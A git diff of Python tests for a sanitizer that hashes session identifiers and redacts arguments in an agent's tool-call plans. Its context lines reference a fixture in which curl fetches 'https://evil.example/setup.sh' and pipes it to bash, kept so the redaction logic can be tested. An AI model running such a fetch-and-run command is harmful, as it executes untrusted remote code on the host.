@@ -78,3 +78,46 @@ def test_redact_args_packs_late_curl_bash_not_just_url() -> None:
     assert "https://evil.example/setup.sh" in packed
     assert "curl" in packed and "bash" in packed
     assert len(packed) <= 500
+
+
+def test_session_key_hashed_independently_of_run_id() -> None:
+    plan = PlanIR.model_validate(
+        {
+            "version": "1.0",
+            "run_id": "sess-raw-abc:run_1",
+            "steps": [
+                {"id": "s1", "tool": "exec", "status": "pending", "args": {"command": "ls"}},
+            ],
+            "metadata": {
+                "adapter": "fixture",
+                "hook": "before_tool_call",
+                "session_id": "sess-raw-abc",
+                "session_key": "agent:main",
+            },
+        }
+    )
+    cleaned = sanitize_planir(plan).plan
+    assert cleaned.metadata.session_id == "sess_6a6cbcb803b1"
+    assert cleaned.metadata.session_key == "sess_f331f052e4ed"
+    assert cleaned.run_id == "sess_6a6cbcb803b1:run_1"
+
+
+def test_session_key_only_rewrites_run_id() -> None:
+    plan = PlanIR.model_validate(
+        {
+            "version": "1.0",
+            "run_id": "main:run_1",
+            "steps": [
+                {"id": "s1", "tool": "exec", "status": "pending", "args": {"command": "ls"}},
+            ],
+            "metadata": {
+                "adapter": "fixture",
+                "hook": "before_tool_call",
+                "session_key": "main",
+            },
+        }
+    )
+    cleaned = sanitize_planir(plan).plan
+    assert cleaned.metadata.session_id is None
+    assert cleaned.metadata.session_key == "sess_0d6e4079e367"
+    assert cleaned.run_id == "sess_0d6e4079e367:run_1"
